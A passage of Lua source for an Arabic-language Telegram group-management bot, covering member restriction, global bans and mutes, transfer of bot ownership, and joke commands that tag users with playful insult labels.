--     Source WAAD     --
--          Tkeed           --
if Admin(msg) then
if text ==('تقييد') or text ==('تقيد') and ChCheck(msg) then
function TkeedReply(extra, result, success)
if not Constructor(msg) and DevAIAN:get(WAAD.."AIAN:Lock:MuteTked"..msg.chat_id_) then 
send(msg.chat_id_, msg.id_,'⌯︙لقد تم تعطيل الكتم والتقيد من قبل المنشئين')
return false
end
if RankChecking(result.sender_user_id_, result.chat_id_) then
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙لا تستطيع تقيد ↫ '..IdRank(result.sender_user_id_, msg.chat_id_), 1, 'md')
else
HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..result.sender_user_id_)
DevAIAN:sadd(WAAD..'AIAN:Tkeed:'..msg.chat_id_, result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","⌯︙تم تقيده من المجموعه")  
end
end 
if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),TkeedReply)
end end
if text and (text:match('^تقييد @(.*)') or text:match('^تقيد @(.*)')) and ChCheck(msg) then
local username = text:match('^تقييد @(.*)') or text:match('^تقيد @(.*)')
function TkeedUser(extra,result,success)
if not Constructor(msg) and DevAIAN:get(WAAD.."AIAN:Lock:MuteTked"..msg.chat_id_) then 
send(msg.chat_id_, msg.id_,'⌯︙لقد تم تعطيل الكتم والتقيد من قبل المنشئين')
return false
end
if result.id_ then
if RankChecking(result.id_, msg.chat_id_) then
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙لا تستطيع تقيد ↫ '..IdRank(result.id_, msg.chat_id_), 1, 'md')
else
HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..result.id_)
DevAIAN:sadd(WAAD..'AIAN:Tkeed:'..msg.chat_id_, result.id_)
ReplyStatus(msg,result.id_,"Reply","⌯︙تم تقيده من المجموعه")  
end
else 
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,TkeedUser)
end
if text and (text:match('^تقييد (%d+)') or text:match('^تقيد (%d+)')) and ChCheck(msg) then
local user = text:match('تقييد (%d+)') or text:match('تقيد (%d+)')
if not Constructor(msg) and DevAIAN:get(WAAD.."AIAN:Lock:MuteTked"..msg.chat_id_) then 
send(msg.chat_id_, msg.id_,'⌯︙لقد تم تعطيل الكتم والتقيد من قبل المنشئين')
return false
end
if RankChecking(user, msg.chat_id_) then
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙لا تستطيع تقيد ↫ '..IdRank(user, msg.chat_id_), 1, 'md')
else
HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..user)
DevAIAN:sadd(WAAD..'AIAN:Tkeed:'..msg.chat_id_, user)
ReplyStatus(msg,user,"Reply","⌯︙تم تقيده من المجموعه")  
end
end
--     Source WAAD     --
--         UnTkeed          --
if text ==('الغاء تقييد') or text ==('الغاء تقيد') and ChCheck(msg) then
function UnTkeedReply(extra, result, success)
HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..result.sender_user_id_.."&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")
DevAIAN:srem(WAAD..'AIAN:Tkeed:'..msg.chat_id_, result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","⌯︙تم الغاء تقيده من المجموعه")  
end
if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),UnTkeedReply)
end end
if text and (text:match('^الغاء تقييد @(.*)') or text:match('^الغاء تقيد @(.*)')) and ChCheck(msg) then
local username = text:match('^الغاء تقييد @(.*)') or text:match('^الغاء تقيد @(.*)')
function UnTkeedUser(extra,result,success)
if result.id_ then
HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..result.id_.."&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")
DevAIAN:srem(WAAD..'AIAN:Tkeed:'..msg.chat_id_, result.id_)
ReplyStatus(msg,result.id_,"Reply","⌯︙تم الغاء تقيده من المجموعه")  
else 
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,UnTkeedUser)
end
if text and (text:match('^الغاء تقييد (%d+)') or text:match('^الغاء تقيد (%d+)')) and ChCheck(msg) then
local user = text:match('الغاء تقييد (%d+)') or text:match('الغاء تقيد (%d+)')
HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..user.."&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")
DevAIAN:srem(WAAD..'AIAN:Tkeed:'..msg.chat_id_, user)
ReplyStatus(msg,user,"Reply","⌯︙تم الغاء تقيده من المجموعه")  
end
end 
end
--     Source WAAD     --
--         BanAll         --
if SecondSudo(msg) then
if text ==('حضر عام') or text ==('حظر عام') then
function BanAllReply(extra, result, success)
if tonumber(result.sender_user_id_) == tonumber(WAAD) then  
Dev_AIAN(msg.chat_id_, msg.id_, 1, "⌯︙*لاتستطيع حظر البوت عام*", 1, 'md')
return false 
end
if SudoId(result.sender_user_id_) == true then
Dev_AIAN(msg.chat_id_, msg.id_, 1, "⌯︙*لاتستطيع حظر المطور الاساسي*", 1, 'md')
return false 
end
if DevAIAN:sismember(WAAD..'AIAN:SecondSudo:',result.sender_user_id_) and not Sudo(msg) then
Dev_AIAN(msg.chat_id_, msg.id_, 1, "⌯︙*لاتستطيع حظر المطور الثانوي*", 1, 'md')
return false 
end
ChatKick(result.chat_id_, result.sender_user_id_)
DevAIAN:sadd(WAAD..'AIAN:BanAll:', result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","⌯︙تم حظره عام من المجموعات")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),BanAllReply)
end end
if text and (text:match('^حضر عام @(.*)') or text:match('^حظر عام @(.*)')) then
local username = text:match('^حضر عام @(.*)') or text:match('^حظر عام @(.*)')
function BanAllUser(extra,result,success)
if tonumber(result.id_) == tonumber(WAAD) then  
Dev_AIAN(msg.chat_id_, msg.id_, 1, "⌯︙*لاتستطيع حظر البوت عام*", 1, 'md')
return false 
end
if SudoId(result.id_) == true then
Dev_AIAN(msg.chat_id_, msg.id_, 1, "⌯︙*لاتستطيع حظر المطور الاساسي*", 1, 'md')
return false 
end
if DevAIAN:sismember(WAAD..'AIAN:SecondSudo:',result.id_) and not Sudo(msg) then
Dev_AIAN(msg.chat_id_, msg.id_, 1, "⌯︙*لاتستطيع حظر المطور الثانوي*", 1, 'md')
return false 
end
if result.id_ then
ChatKick(msg.chat_id_, result.id_)
DevAIAN:sadd(WAAD..'AIAN:BanAll:', result.id_)
ReplyStatus(msg,result.id_,"Reply","⌯︙تم حظره عام من المجموعات")  
else 
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,BanAllUser)
end
if text and (text:match('^حضر عام (%d+)') or text:match('^حظر عام (%d+)')) then
local user = text:match('حضر عام (%d+)') or text:match('حظر عام (%d+)')
if tonumber(user) == tonumber(WAAD) then  
Dev_AIAN(msg.chat_id_, msg.id_, 1, "⌯︙*لاتستطيع حظر البوت عام*", 1, 'md')
return false 
end
if SudoId(tonumber(user)) == true then
Dev_AIAN(msg.chat_id_, msg.id_, 1, "⌯︙*لاتستطيع حظر المطور الاساسي*", 1, 'md')
return false 
end
if DevAIAN:sismember(WAAD..'AIAN:SecondSudo:',user) and not Sudo(msg) then
Dev_AIAN(msg.chat_id_, msg.id_, 1, "⌯︙*لاتستطيع حظر المطور الثانوي*", 1, 'md')
return false 
end
ChatKick(msg.chat_id_, user)
DevAIAN:sadd(WAAD..'AIAN:BanAll:', user)
ReplyStatus(msg,user,"Reply","⌯︙تم حظره عام من المجموعات")  
end
--     Source WAAD     --
--         MuteAll        --
if text ==('كتم عام') then
function MuteAllReply(extra, result, success)
if tonumber(result.sender_user_id_) == tonumber(WAAD) then  
Dev_AIAN(msg.chat_id_, msg.id_, 1, "⌯︙*لاتستطيع كتم البوت عام*", 1, 'md')
return false 
end
if SudoId(result.sender_user_id_) == true then
Dev_AIAN(msg.chat_id_, msg.id_, 1, "⌯︙*لاتستطيع كتم المطور الاساسي*", 1, 'md')
return false 
end
if DevAIAN:sismember(WAAD..'AIAN:SecondSudo:',result.sender_user_id_) and not Sudo(msg) then
Dev_AIAN(msg.chat_id_, msg.id_, 1, "⌯︙*لاتستطيع كتم المطور الثانوي*", 1, 'md')
return false 
end
DevAIAN:sadd(WAAD..'AIAN:MuteAll:', result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","⌯︙تم كتمه عام من المجموعات")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),MuteAllReply)
end end
if text and text:match('^كتم عام @(.*)') then
local username = text:match('^كتم عام @(.*)')
function MuteAllUser(extra,result,success)
if tonumber(result.id_) == tonumber(WAAD) then  
Dev_AIAN(msg.chat_id_, msg.id_, 1, "⌯︙*لاتستطيع كتم البوت عام*", 1, 'md')
return false 
end
if SudoId(result.id_) == true then
Dev_AIAN(msg.chat_id_, msg.id_, 1, "⌯︙*لاتستطيع كتم المطور الاساسي*", 1, 'md')
return false 
end
if DevAIAN:sismember(WAAD..'AIAN:SecondSudo:',result.id_) and not Sudo(msg) then
Dev_AIAN(msg.chat_id_, msg.id_, 1, "⌯︙*لاتستطيع كتم المطور الثانوي*", 1, 'md')
return false 
end
if result.id_ then
DevAIAN:sadd(WAAD..'AIAN:MuteAll:', result.id_)
ReplyStatus(msg,result.id_,"Reply","⌯︙تم كتمه عام من المجموعات")  
else 
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,MuteAllUser)
end
if text and text:match('^كتم عام (%d+)') then
local user = text:match('كتم عام (%d+)')
if tonumber(user) == tonumber(WAAD) then  
Dev_AIAN(msg.chat_id_, msg.id_, 1, "⌯︙*لاتستطيع كتم البوت عام*", 1, 'md')
return false 
end
if SudoId(tonumber(user)) == true then
Dev_AIAN(msg.chat_id_, msg.id_, 1, "⌯︙*لاتستطيع كتم المطور الاساسي*", 1, 'md')
return false 
end
if DevAIAN:sismember(WAAD..'AIAN:SecondSudo:',user) and not Sudo(msg) then
Dev_AIAN(msg.chat_id_, msg.id_, 1, "⌯︙*لاتستطيع كتم المطور الثانوي*", 1, 'md')
return false 
end
DevAIAN:sadd(WAAD..'AIAN:MuteAll:', user)
ReplyStatus(msg,user,"Reply","⌯︙تم كتمه عام من المجموعات")  
end
--     Source WAAD     --
--         UnAll          --
if text ==('الغاء عام') or text ==('الغاء العام') then
function UnAllReply(extra, result, success)
DevAIAN:srem(WAAD..'AIAN:BanAll:', result.sender_user_id_)
DevAIAN:srem(WAAD..'AIAN:MuteAll:', result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","⌯︙تم الغاء (الحظر • الكتم) عام من المجموعات")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),UnAllReply)
end end
if text and (text:match('^الغاء عام @(.*)') or text:match('^الغاء العام @(.*)')) then
local username = text:match('^الغاء عام @(.*)') or text:match('^الغاء العام @(.*)')
function UnAllUser(extra,result,success)
if result.id_ then
DevAIAN:srem(WAAD..'AIAN:BanAll:', result.id_)
DevAIAN:srem(WAAD..'AIAN:MuteAll:', result.id_)
ReplyStatus(msg,result.id_,"Reply","⌯︙تم الغاء (الحظر • الكتم) عام من المجموعات")  
else 
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,UnAllUser)
end
if text and (text:match('^الغاء عام (%d+)') or text:match('^الغاء العام (%d+)')) then
local user = text:match('الغاء عام (%d+)') or text:match('الغاء العام (%d+)')
DevAIAN:srem(WAAD..'AIAN:BanAll:', user)
DevAIAN:srem(WAAD..'AIAN:MuteAll:', user)
ReplyStatus(msg,user,"Reply","⌯︙تم الغاء (الحظر • الكتم) عام من المجموعات")  
end
end
end
--     Source WAAD     --
if (text == "تغير المطور الاساسي" or text == "نقل ملكيه البوت" or text == "تغيير المطور الاساسي" or text == "↫ تغير المطور الاساسي ⌯") and msg.reply_to_message_id_ == 0 and Sudo(msg) then 
send(msg.chat_id_, msg.id_,'⌯︙يجب التاكد ان المطور الجديد ارسل start لخاص البوت بعد ذلك يمكنك ارسال ايدي المطور')
DevAIAN:setex(WAAD.."AIAN:EditDev"..msg.sender_user_id_,300,true)
end
if DevAIAN:get(WAAD.."AIAN:EditDev"..msg.sender_user_id_) then
if text and text:match("^الغاء$") then 
send(msg.chat_id_, msg.id_,'⌯︙تم الغاء امر تغير المطور الاساسي')
DevAIAN:del(WAAD.."AIAN:EditDev"..msg.sender_user_id_)
return false
end
if text and text:match("^(%d+)$") then 
tdcli_function ({ID = "GetUser",user_id_ = text},function(arg,dp) 
if dp.first_name_ ~= false then
DevAIAN:del(WAAD.."AIAN:EditDev"..msg.sender_user_id_)
DevAIAN:set(WAAD.."AIAN:NewDev"..msg.sender_user_id_,dp.id_)
if dp.username_ ~= false then DevUser = '\n⌯︙المعرف ↫ [@'..dp.username_..']' else DevUser = '' end
local Text = '⌯︙الايدي ↫ '..dp.id_..DevUser..'\n⌯︙الاسم ↫ ['..dp.first_name_..'](tg://user?id='..dp.id_..')\n⌯︙تم حفظ المعلومات بنجاح\n⌯︙استخدم الازرار للتاكيد ↫ ⤈'
keyboard = {} 
keyboard.inline_keyboard = {{{text="نعم",callback_data="/setyes"},{text="لا",callback_data="/setno"}}} 
Msg_id = msg.id_/2097152/0.5
return https.request("https://api.telegram.org/bot"..TokenBot..'/sendMessage?chat_id='..msg.chat_id_..'&text=' .. URL.escape(Text).."&reply_to_message_id="..Msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
else
send(msg.chat_id_, msg.id_,"⌯︙المعلومات خاطئه قم بالتاكد واعد المحاوله")
DevAIAN:del(WAAD.."AIAN:EditDev"..msg.sender_user_id_)
end
end,nil)
return false
end
end
--     Source WAAD     --
if msg.reply_to_message_id_ ~= 0 then
if text and text:match("^رفع مطي$") and not DevAIAN:get(WAAD..'AIAN:Lock:Stupid'..msg.chat_id_) and ChCheck(msg) then
function donky_by_reply(extra, result, success)
if DevAIAN:sismember(WAAD..'User:Donky:'..msg.chat_id_, result.sender_user_id_) then
ReplyStatus(msg,result.sender_user_id_,"Reply","⌯︙هو مطي شرفع منه بعد😹💔") 
else
ReplyStatus(msg,result.sender_user_id_,"Reply","⌯︙تم رفعه في قائمة المطايه\n✓") 
DevAIAN:sadd(WAAD..'User:Donky:'..msg.chat_id_, result.sender_user_id_)
end end
getMessage(msg.chat_id_, msg.reply_to_message_id_,donky_by_reply)
end end
--     Source WAAD     --
if msg.reply_to_message_id_ ~= 0  then
if text and text:match("^تنزيل مطي$") and not DevAIAN:get(WAAD..'AIAN:Lock:Stupid'..msg.chat_id_) and ChCheck(msg) then
function donky_by_reply(extra, result, success)
if not DevAIAN:sismember(WAAD..'User:Donky:'..msg.chat_id_, result.sender_user_id_) then
ReplyStatus(msg,result.sender_user_id_,"Reply","⌯︙هو ليس مطي ليتم تنزيله") 
else
DevAIAN:srem(WAAD..'User:Donky:'..msg.chat_id_, result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","⌯︙تم تنزيله من قائمة المطايه\n✓") 
end end
getMessage(msg.chat_id_, msg.reply_to_message_id_,donky_by_reply)
end end
--     Source WAAD     --
if msg.reply_to_message_id_ ~= 0 then
if text and text:match("^رفع حاته$") and not DevAIAN:get(WAAD..'AIAN:Lock:Stupid'..msg.chat_id_) and ChCheck(msg) then
function HaTa_by_reply(extra, result, success)
if DevAIAN:sismember(WAAD..'User:HaTa:'..msg.chat_id_, result.sender_user_id_) then
ReplyStatus(msg,result.sender_user_id_,"Reply","⌯︙هي حاته شرفع منه بعد😹💔") 
else
ReplyStatus(msg,result.sender_user_id_,"Reply","⌯︙تم رفعه في قائمة الحاتات\n✓") 
DevAIAN:sadd(WAAD..'User:HaTa:'..msg.chat_id_, result.sender_user_id_)
end end
getMessage(msg.chat_id_, msg.reply_to_message_id_,HaTa_by_reply)
end end
--     Source WAAD     --
if msg.reply_to_message_id_ ~= 0  then
if text and text:match("^تنزيل حاته$") and not DevAIAN:get(WAAD..'AIAN:Lock:Stupid'..msg.chat_id_) and ChCheck(msg) then
function HaTa_by_reply(extra, result, success)
if not DevAIAN:sismember(WAAD..'User:HaTa:'..msg.chat_id_, result.sender_user_id_) then
ReplyStatus(msg,result.sender_user_id_,"Reply","⌯︙هي ليس حاته ليتم تنزيله") 
else
DevAIAN:srem(WAAD..'User:HaTa:'..msg.chat_id_, result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","⌯︙تم تنزيله من قائمة الحاتات\n✓") 
end end
getMessage(msg.chat_id_, msg.reply_to_message_id_,HaTa_by_reply)
end end
--     Source WAAD     --
if msg.reply_to_message_id_ ~= 0 then
if text and text:match("^رفع صاك$") and not DevAIAN:get(WAAD..'AIAN:Lock:Stupid'..msg.chat_id_) and ChCheck(msg) then
function hlo_by_reply(extra, result, success)
if DevAIAN:sismember(WAAD..'User:hlo:'..msg.chat_id_, result.sender_user_id_) then
ReplyStatus(msg,result.sender_user_id_,"Reply","⌯︙هو صاك شرفع منه بعد😹💔") 
else
ReplyStatus(msg,result.sender_user_id_,"Reply","⌯︙تم رفعه في قائمة الصاكين\n✓") 
DevAIAN:sadd(WAAD..'User:hlo:'..msg.chat_id_, result.sender_user_id_)
end end
getMessage(msg.chat_id_, msg.reply_to_message_id_,hlo_by_reply)
end end
--     Source WAAD     --
if msg.reply_to_message_id_ ~= 0  then
if text and text:match("^تنزيل صاك$") and not DevAIAN:get(WAAD..'AIAN:Lock:Stupid'..msg.chat_id_) and ChCheck(msg) then
function hlo_by_reply(extra, result, success)
if not DevAIAN:sismember(WAAD..'User:hlo:'..msg.chat_id_, result.sender_user_id_) then
ReplyStatus(msg,result.sender_user_id_,"Reply","⌯︙هو ليس صاك ليتم تنزيله") 
else
DevAIAN:srem(WAAD..'User:hlo:'..msg.chat_id_, result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","⌯︙تم تنزيله من قائمة الصاكين\n✓") 
end end
getMessage(msg.chat_id_, msg.reply_to_message_id_,hlo_by_reply)
end end
--     Source WAAD     --
if msg.reply_to_message_id_ ~= 0 then
if text and text:match("^رفع صخل$") and not DevAIAN:get(WAAD..'AIAN:Lock:Stupid'..msg.chat_id_) and ChCheck(msg) then
function Sakl_by_reply(extra, result, success)
if DevAIAN:sismember(WAAD..'User:Sakl:'..msg.chat_id_, result.sender_user_id_) then
ReplyStatus(msg,result.sender_user_id_,"Reply","⌯︙هو صخل شرفع منه بعد😹💔") 
else
ReplyStatus(msg,result.sender_user_id_,"Reply","⌯︙تم رفعه في قائمة الصخوله\n✓") 
DevAIAN:sadd(WAAD..'User:Sakl:'..msg.chat_id_, result.sender_user_id_)
end end
getMessage(msg.chat_id_, msg.reply_to_message_id_,Sakl_by_reply)
end end
--     Source WAAD     --
if msg.reply_to_message_id_ ~= 0  then
if text and text:match("^تنزيل صخل$") and not DevAIAN:get(WAAD..'AIAN:Lock:Stupid'..msg.chat_id_) and ChCheck(msg) then
function Sakl_by_reply(extra, result, success)
if not DevAIAN:sismember(WAAD..'User:Sakl:'..msg.chat_id_, result.sender_user_id_) then
ReplyStatus(msg,result.sender_user_id_,"Reply","⌯︙هو ليس صخل ليتم تنزيله") 
else
DevAIAN:srem(WAAD..'User:Sakl:'..msg.chat_id_, result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","⌯︙تم تنزيله من قائمة الصخوله\n✓") 
end end
getMessage(msg.chat_id_, msg.reply_to_message_id_,Sakl_by_reply)
end end
--     Source WAAD     --
if msg.reply_to_message_id_ ~= 0 then
if text and text:match("^رفع جلب$") and not DevAIAN:get(WAAD..'AIAN:Lock:Stupid'..msg.chat_id_) and ChCheck(msg) then
function Dog_by_reply(extra, result, success)
if DevAIAN:sismember(WAAD..'User:Dog:'..msg.chat_id_, result.sender_user_id_) then
ReplyStatus(msg,result.sender_user_id_,"Reply","⌯︙هو جلب شرفع منه بعد😹💔") 
else
ReplyStatus(msg,result.sender_user_id_,"Reply","⌯︙تم رفعه في قائمة الجلاب\n✓") 
DevAIAN:sadd(WAAD..'User:Dog:'..msg.chat_id_, result.sender_user_id_)
end end
getMessage(msg.chat_id_, msg.reply_to_message_id_,Dog_by_reply)
end end
--     Source WAAD     --
if msg.reply_to_message_id_ ~= 0  then
if text and text:match("^تنزيل جلب$") and not DevAIAN:get(WAAD..'AIAN:Lock:Stupid'..msg.chat_id_) and ChCheck(msg) then
function Dog_by_reply(extra, result, success)
if not DevAIAN:sismember(WAAD..'User:Dog:'..msg.chat_id_, result.sender_user_id_) then
ReplyStatus(msg,result.sender_user_id_,"Reply","⌯︙هو ليس جلب ليتم تنزيله") 
else
DevAIAN:srem(WAAD..'User:Dog:'..msg.chat_id_, result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","⌯︙تم تنزيله من قائمة الجلاب\n✓") 
end end
getMessage(msg.chat_id_, msg.reply_to_message_id_,Dog_by_reply)
end end
--     Source WAAD     --
if msg.reply_to_message_id_ ~= 0 then
if text and text:match("^رفع ضلعه$") and not DevAIAN:get(WAAD..'AIAN:Lock:Stupid'..msg.chat_id_) and ChCheck(msg) then
function Bro_Gir_lby_reply(extra, result, success)
if DevAIAN:sismember(WAAD..'User:Bro:Girl'..msg.chat_id_, result.sender_user_id_) then
ReplyStatus(msg,result.sender_user_id_,"Reply","⌯︙هي ضلعه شرفع منه بعد😹💔") 
else
ReplyStatus(msg,result.sender_user_id_,"Reply","⌯︙تم رفعه في قائمة الضلعات\n✓") 
DevAIAN:sadd(WAAD..'User:Bro:Girl'..msg.chat_id_, result.sender_user_id_)
end end
getMessage(msg.chat_id_, msg.reply_to_message_id_,Bro_Gir_lby_reply)
end end
--     Source WAAD     --
if msg.reply_to_message_id_ ~= 0  then
if text and text:match("^تنزيل ضلعه$") and not DevAIAN:get(WAAD..'AIAN:Lock:Stupid'..msg.chat_id_) and ChCheck(msg) then
function Bro_Gir_lby_reply(extra, result, success)
if not DevAIAN:sismember(WAAD..'User:Bro:Girl'..msg.chat_id_, result.sender_user_id_) then
ReplyStatus(msg,result.sender_user_id_,"Reply","⌯︙هي ليست ضلعه ليتم تنزيله") 
else
DevAIAN:srem(WAAD..'User:Bro:Girl'..msg.chat_id_, result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","⌯︙تم تنزيله من قائمة الضلعات\n✓") 
end end
getMessage(msg.chat_id_, msg.reply_to_message_id_,Bro_Gir_lby_reply)
end end
--     Source WAAD     --
if msg.reply_to_message_id_ ~= 0 then
if text and text:match("^رفع ضلع$") and not DevAIAN:get(WAAD..'AIAN:Lock:Stupid'..msg.chat_id_) and ChCheck(msg) then
function Bro_by_reply(extra, result, success)
if DevAIAN:sismember(WAAD..'User:Bro:'..msg.chat_id_, result.sender_user_id_) then
ReplyStatus(msg,result.sender_user_id_,"Reply","⌯︙هو ضلع شرفع منه بعد😹💔") 
else
ReplyStatus(msg,result.sender_user_id_,"Reply","⌯︙تم رفعه في قائمة الضلوع\n✓") 
DevAIAN:sadd(WAAD..'User:Bro:'..msg.chat_id_, result.sender_user_id_)
end end
getMessage(msg.chat_id_, msg.reply_to_message_id_,Bro_by_reply)
end end
--     Source WAAD     --
if msg.reply_to_message_id_ ~= 0  then
if text and text:match("^تنزيل ضلع$") and not DevAIAN:get(WAAD..'AIAN:Lock:Stupid'..msg.chat_id_) and ChCheck(msg) then
function Bro_by_reply(extra, result, success)
if not DevAIAN:sismember(WAAD..'User:Bro:'..msg.chat_id_, result.sender_user_id_) then
ReplyStatus(msg,result.sender_user_id_,"Reply","⌯︙هو ليس ضلع ليتم تنزيله") 
else
DevAIAN:srem(WAAD..'User:Bro:'..msg.chat_id_, result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","⌯︙تم تنزيله من قائمة الضلوع\n✓") 
end end
getMessage(msg.chat_id_, msg.reply_to_message_id_,Bro_by_reply)
end end
--     Source WAAD     --
if msg.reply_to_message_id_ ~= 0 then
if text and text:match("^رفع بقره$") and not DevAIAN:get(WAAD..'AIAN:Lock:Stupid'..msg.chat_id_) and ChCheck(msg) then
function Bakra_lby_reply(extra, result, success)
if DevAIAN:sismember(WAAD..'User:Bakra:'..msg.chat_id_, result.sender_user_id_) then
ReplyStatus(msg,result.sender_user_id_,"Reply","⌯︙هي بقره شرفع منه بعد😹💔") 
else
ReplyStatus(msg,result.sender_user_id_,"Reply","⌯︙تم رفعه في قائمة الهوايش\n✓") 
DevAIAN:sadd(WAAD..'User:Bakra:'..msg.chat_id_, result.sender_user_id_)
end end
getMessage(msg.chat_id_, msg.reply_to_message_id_,Bakra_lby_reply)
end end
--     Source WAAD     --
if msg.reply_to_message_id_ ~= 0  then
if text and text:match("^تنزيل بقره$") and not DevAIAN:get(WAAD..'AIAN:Lock:Stupid'..msg.chat_id_) and ChCheck(msg) then
function Bakra_lby_reply(extra, result, success)
if not DevAIAN:sismember(WAAD..'User:Bakra:'..msg.chat_id_, result.sender_user_id_) then
ReplyStatus(msg,result.sender_user_id_,"Reply","⌯︙هي ليست بقره ليتم تنزيله") 
else
DevAIAN:srem(WAAD..'User:Bakra:'..msg.chat_id_, result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","⌯︙تم تنزيله من قائمة الهوايش\n✓") 
end end
getMessage(msg.chat_id_, msg.reply_to_message_id_,Bakra_lby_reply)
end end
--     Source WAAD     --
if msg.reply_to_message_id_ ~= 0 then
if text and text:match("^رفع طلي$") and not DevAIAN:get(WAAD..'AIAN:Lock:Stupid'..msg.chat_id_) and ChCheck(msg) then
function Tale_lby_reply(extra, result, success)
if DevAIAN:sismember(WAAD..'User:Tale:'..msg.chat_id_, result.sender_user_id_) then
ReplyStatus(msg,result.sender_user_id_,"Reply","⌯︙هو طلي شرفع منه بعد😹💔") 
else
ReplyStatus(msg,result.sender_user_id_,"Reply","⌯︙تم رفعه في قائمة الطليان\n✓") 
DevAIAN:sadd(WAAD..'User:Tale:'..msg.chat_id_, result.sender_user_id_)
end end
getMessage(msg.chat_id_, msg.reply_to_message_id_,Tale_lby_reply)
end end
--     Source WAAD     --
if msg.reply_to_message_id_ ~= 0  then
if text and text:match("^تنزيل طلي$") and not DevAIAN:get(WAAD..'AIAN:Lock:Stupid'..msg.chat_id_) and ChCheck(msg) then
function Tale_lby_reply(extra, result, success)
if not DevAIAN:sismember(WAAD..'User:Tale:'..msg.chat_id_, result.sender_user_id_) then
ReplyStatus(msg,result.sender_user_id_,"Reply","⌯︙هو ليس طلي ليتم تنزيله") 
else
DevAIAN:srem(WAAD..'User:Tale:'..msg.chat_id_, result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","⌯︙تم تنزيله من قائمة الطليان\n✓") 
end end
getMessage(msg.chat_id_, msg.reply_to_message_id_,Tale_lby_reply)
end end
--     Source WAAD     --
if msg.reply_to_message_id_ ~= 0 then
if text and text:match("^رفع زاحف$") and not DevAIAN:get(WAAD..'AIAN:Lock:Stupid'..msg.chat_id_) and ChCheck(msg) then
function Zahf_lby_reply(extra, result, success)
if DevAIAN:sismember(WAAD..'User:Zahf:'..msg.chat_id_, result.sender_user_id_) then
ReplyStatus(msg,result.sender_user_id_,"Reply","⌯︙هو زاحف شرفع منه بعد😹💔") 
else
ReplyStatus(msg,result.sender_user_id_,"Reply","⌯︙تم رفعه في قائمة الزواحف\n✓") 
DevAIAN:sadd(WAAD..'User:Zahf:'..msg.chat_id_, result.sender_user_id_)
end end
getMessage(msg.chat_id_, msg.reply_to_message_id_,Zahf_lby_reply)
end end
--     Source WAAD     --
if msg.reply_to_message_id_ ~= 0  then
if text and text:match("^تنزيل زاحف$") and not DevAIAN:get(WAAD..'AIAN:Lock:Stupid'..msg.chat_id_) and ChCheck(msg) then
function Zahf_lby_reply(extra, result, success)
if not DevAIAN:sismember(WAAD..'User:Zahf:'..msg.chat_id_, result.sender_user_id_) then
ReplyStatus(msg,result.sender_user_id_,"Reply","⌯︙هو ليس زاحف ليتم تنزيله") 
else
DevAIAN:srem(WAAD..'User:Zahf:'..msg.chat_id_, result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","⌯︙تم تنزيله من قائمة الزواحف\n✓") 
end end
getMessage(msg.chat_id_, msg.reply_to_message_id_,Zahf_lby_reply)
end end
--     Source WAAD     --
if msg.reply_to_message_id_ ~= 0 then
if text and text:match("^رفع جريذي$") and not DevAIAN:get(WAAD..'AIAN:Lock:Stupid'..msg.chat_id_) and ChCheck(msg) then
function Jred_lby_reply(extra, result, success)
if DevAIAN:sismember(WAAD..'User:Jred:'..msg.chat_id_, result.sender_user_id_) then
